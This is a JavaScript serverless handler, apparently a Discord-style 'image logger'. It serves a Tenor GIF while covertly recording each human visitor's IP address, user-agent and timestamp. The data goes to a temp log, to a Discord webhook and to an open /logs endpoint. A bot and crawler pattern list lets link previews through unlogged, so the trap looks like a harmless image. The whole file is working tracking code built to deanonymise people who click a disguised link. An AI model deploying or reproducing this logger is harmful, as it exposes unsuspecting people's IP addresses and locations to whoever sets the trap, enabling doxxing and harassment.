export default async function handler(req, res) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || req.socket.remoteAddress || 'unknown';
  const userAgent = req.headers['user-agent'] || 'unknown';
  const timestamp = new Date().toISOString();

  const botPatterns = /bot|crawler|spider|scraper|curl|wget|python|java|perl|php|ruby|go-http|okhttp|httpclient|axios|requests|urllib|robot|validator|fetcher|pingdom|uptimerobot|newrelic|datadog|sentry|googlebot|bingbot|slurp|baiduspider|yandex|duckduckbot|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|headless|phantomjs|selenium|puppeteer|playwright/i;
  
  if (botPatterns.test(userAgent)) {
    try {
      const https = await import('https');
      const imageUrl = 'https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif';
      https.get(imageUrl, (imageRes) => {
        const chunks = [];
        imageRes.on('data', (chunk) => chunks.push(chunk));
        imageRes.on('end', () => {
          const buffer = Buffer.concat(chunks);
          res.setHeader('Content-Type', 'image/gif');
          res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
          res.setHeader('Pragma', 'no-cache');
          res.setHeader('Expires', '0');
          res.setHeader('Content-Length', buffer.length);
          res.status(200).send(buffer);
        });
      }).on('error', () => {
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.status(200).send(`<!DOCTYPE html><html><head><meta property="og:image" content="https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"></head><body><img src="https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"></body></html>`);
      });
    } catch (e) {
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      res.status(200).send(`<!DOCTYPE html><html><head><meta property="og:image" content="https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"></head><body><img src="https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"></body></html>`);
    }
    return;
  }

  const logEntry = { ip, userAgent, timestamp, url: req.url };
  const logLine = JSON.stringify(logEntry) + '\n';

  try {
    const fs = await import('fs');
    const path = await import('path');
    const os = await import('os');
    
    const logDir = path.join(os.tmpdir(), 'image-logger');
    const logFile = path.join(logDir, 'logs.jsonl');
    
    if (!fs.existsSync(logDir)) {
      fs.mkdirSync(logDir, { recursive: true });
    }
    fs.appendFileSync(logFile, logLine);
  } catch (e) {
    console.error('Log write failed:', e);
  }

  const webhookUrl = process.env.WEBHOOK_URL || process.env.DISCORD_WEBHOOK_URL || '';
  if (webhookUrl) {
    try {
      const https = await import('https');
      const payload = JSON.stringify({
        embeds: [{
          title: '📸 Image Logger Capture',
          color: 5763719,
          fields: [
            { name: 'IP Address', value: ip || 'unknown', inline: true },
            { name: 'User-Agent', value: (userAgent || 'unknown').substring(0, 1024), inline: false },
            { name: 'Timestamp', value: timestamp, inline: true },
            { name: 'URL', value: req.url || '/', inline: true }
          ],
          footer: { text: 'Image Logger' },
          timestamp: new Date().toISOString()
        }]
      });
      
      const url = new URL(webhookUrl);
      const options = {
        hostname: url.hostname,
        path: url.pathname,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      };
      
      const reqWebhook = https.request(options, (resWebhook) => {
        resWebhook.on('data', () => {});
        resWebhook.on('end', () => {});
      });
      
      reqWebhook.on('error', () => {});
      reqWebhook.write(payload);
      reqWebhook.end();
    } catch (e) {
      console.error('Webhook send failed:', e);
    }
  }

  if (req.method === 'GET' && (req.url === '/logs' || req.url === '/api/logs')) {
    try {
      const fs = await import('fs');
      const path = await import('path');
      const os = await import('os');
      
      const logFile = path.join(os.tmpdir(), 'image-logger', 'logs.jsonl');
      if (fs.existsSync(logFile)) {
        const data = fs.readFileSync(logFile, 'utf8');
        const lines = data.trim().split('\n').filter(Boolean);
        const logs = lines.map(line => JSON.parse(line));
        res.setHeader('Content-Type', 'application/json');
        res.status(200).json(logs);
      } else {
        res.status(200).json([]);
      }
    } catch (e) {
      res.status(500).json({ error: 'Failed to read logs' });
    }
    return;
  }

  try {
    const https = await import('https');
    const imageUrl = 'https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif';
    
    https.get(imageUrl, (imageRes) => {
      const chunks = [];
      imageRes.on('data', (chunk) => chunks.push(chunk));
      imageRes.on('end', () => {
        const buffer = Buffer.concat(chunks);
        res.setHeader('Content-Type', 'image/gif');
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        res.setHeader('Pragma', 'no-cache');
        res.setHeader('Expires', '0');
        res.setHeader('Content-Length', buffer.length);
        res.status(200).send(buffer);
      });
    }).on('error', () => {
      res.setHeader('Content-Type', 'text/html; charset=utf-8');
      res.status(200).send(`<!DOCTYPE html><html><head><meta property="og:image" content="https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"></head><body><img src="https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"></body></html>`);
    });
  } catch (e) {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.status(200).send(`<!DOCTYPE html><html><head><meta property="og:image" content="https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"></head><body><img src="https://c.tenor.com/HtRab3iYiisAAAAC/tenor.gif"></body></html>`);
  }
}
